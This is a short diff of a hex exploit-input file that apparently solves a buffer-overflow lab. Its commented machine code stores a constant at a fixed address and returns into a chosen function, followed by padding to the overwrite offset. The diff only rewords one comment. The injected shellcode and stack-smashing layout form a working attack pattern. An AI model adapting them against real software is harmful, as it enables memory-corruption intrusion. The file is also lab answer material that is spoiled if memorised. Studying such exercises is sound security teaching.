@@ -2,7 +2,7 @@ b8 e8 d1 04 08    /* mov  $0x804d1e8,%eax */
 c7 00 76 35 f7 60 /* movl  $0x60f73576,(%eax) */
 68 46 94 04 08    /* push $0x8049446 */
 c3                /* ret */
-30 30 30 30 30    /* end at +22, needs another 44 bytes */
+30 30 30 30 30    /* this line end at +22, needs another 44 bytes */
 30 30 30 30
 30 30 30 30
 30 30 30 30
